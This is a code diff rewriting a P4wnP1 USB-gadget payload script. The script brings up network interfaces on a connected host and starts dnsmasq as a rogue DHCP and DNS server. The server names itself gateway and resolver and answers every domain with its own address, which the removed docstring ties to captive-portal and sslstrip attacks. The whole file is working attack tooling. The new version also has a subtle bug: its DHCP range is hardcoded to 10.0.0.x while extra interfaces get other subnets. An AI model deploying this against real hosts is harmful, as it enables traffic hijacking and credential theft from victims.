@@ -1,97 +1,50 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Launch a rogue dnsmasq bound to the device's primary interface & /24 network.
+import subprocess, shlex, sys
 
-- Gateway/DNS is the device's current primary IP (usb0 > eth0 > wlan0 > any)
-- DHCP range auto-picked within that /24 (safe offsets)
-- Wildcard DNS (address=/#/<gw>) for captive-portal/sslstrip flows
+P4WNCTL = "/opt/p4wnp1/p4wnctl.py"
 
-Stops any previous instance via PID file. Writes confs to /run/p4wnp1/.
-"""
+def sh(cmd):
+    return subprocess.check_output(cmd, shell=True, text=True).strip()
 
-import ipaddress
-import os
-import signal
-import subprocess
-import sys
-from pathlib import Path
-from payloads.lib.netutil import primary_ip, primary_iface
+def gadget_ifaces():
+    try:
+        out = sh(f"{shlex.quote(P4WNCTL)} gadget-ifaces")
+        return [l.strip() for l in out.splitlines() if l.strip()]
+    except Exception:
+        return []
 
-RUNDIR = Path("/run/p4wnp1")
-RUNDIR.mkdir(parents=True, exist_ok=True)
-CONF = RUNDIR / "dnsmasq-rogue.conf"
-PIDF = RUNDIR / "dnsmasq-rogue.pid"
-LEASES = RUNDIR / "dnsmasq-rogue.leases"
-LOGF = RUNDIR / "dnsmasq-rogue.log"
+def up_iface(iface, cidr="10.0.0.1/24"):
+    subprocess.run(["ip","link","set",iface,"up"], check=True)
+    subprocess.run(["ip","addr","flush","dev",iface], check=False)
+    subprocess.run(["ip","addr","add",cidr,"dev",iface], check=True)
 
-def stop_if_running():
-    if PIDF.exists():
-        try:
-            pid = int(PIDF.read_text().strip())
-            os.kill(pid, signal.SIGTERM)
-        except Exception:
-            pass
-        try:
-            PIDF.unlink()
-        except Exception:
-            pass
-
-def compute_net(ipstr: str):
-    iface = primary_iface() or "usb0"
-    iface_cidr = ipaddress.ip_interface(f"{ipstr}/24")  # assume /24 for gadget setups
-    net = iface_cidr.network
-    hosts = list(net.hosts())
-    # pick a conservative slice for DHCP
-    start = hosts[10] if len(hosts) > 120 else hosts[max(2, len(hosts)//16)]
-    end   = hosts[100] if len(hosts) > 140 else hosts[min(len(hosts)-2, (len(hosts)//16)*8)]
-    return iface, str(iface_cidr.ip), str(start), str(end), str(net.network_address), str(net.broadcast_address)
-
-def write_conf(iface: str, gw: str, dhcp_start: str, dhcp_end: str):
-    contents = f"""\
-bind-interfaces
+def run_dnsmasq(iface, gw="10.0.0.1"):
+    conf = f"""
 interface={iface}
-no-resolv
-log-queries
-log-facility={LOGF}
-dhcp-authoritative
-dhcp-leasefile={LEASES}
-dhcp-range={dhcp_start},{dhcp_end},12h
+bind-interfaces
+dhcp-range=10.0.0.50,10.0.0.150,12h
 dhcp-option=3,{gw}
 dhcp-option=6,{gw}
 address=/#/{gw}
+log-queries
 """
-    CONF.write_text(contents)
-
-def start_dnsmasq():
-    cmd = [
-        "/usr/sbin/dnsmasq",
-        "--conf-file=" + str(CONF),
-        "--pid-file=" + str(PIDF),
-        "--keep-in-foreground",
-    ]
-    # Run in foreground so payload runner captures exit; daemonize by removing keep-in-foreground.
-    print(f"[dnsmasq] launching: {' '.join(cmd)}")
-    p = subprocess.Popen(cmd)
-    # For long-running interactive mode, you might keep p.wait()
-    # Here we return immediately but print basics
-    print(f"[dnsmasq] pid={p.pid}  conf={CONF}  leases={LEASES}")
-    return 0
+    tmp = f"/run/dnsmasq-{iface}.conf"
+    open(tmp,"w").write(conf)
+    subprocess.Popen(["dnsmasq","--keep-in-foreground","--conf-file="+tmp])
 
 def main():
-    gw = primary_ip()
-    if not gw:
-        print("[-] Could not determine primary IP")
-        return 1
-    iface, gw_ip, dhcp_start, dhcp_end, net_addr, bcast = compute_net(gw)
-    print(f"[+] Interface: {iface}")
-    print(f"[+] Gateway:   {gw_ip}")
-    print(f"[+] Subnet:    {net_addr}/24  (broadcast {bcast})")
-    print(f"[+] DHCP:      {dhcp_start} – {dhcp_end}")
-
-    stop_if_running()
-    write_conf(iface, gw_ip, dhcp_start, dhcp_end)
-    return start_dnsmasq()
+    ifaces = gadget_ifaces()
+    if not ifaces:
+        print("[!] No USB gadget network interface present (host likely has no driver). Exiting.")
+        sys.exit(0)
+    for idx,iface in enumerate(ifaces):
+        # vary subnets if multiple gadget NICs exist
+        oct = 10 + idx
+        cidr = f"10.{oct}.0.1/24"
+        gw   = f"10.{oct}.0.1"
+        up_iface(iface, cidr)
+        run_dnsmasq(iface, gw)
+    print(f"[+] Rogue DHCP/DNS running on: {', '.join(ifaces)}")
 
 if __name__ == "__main__":
-    sys.exit(main())
+    main()
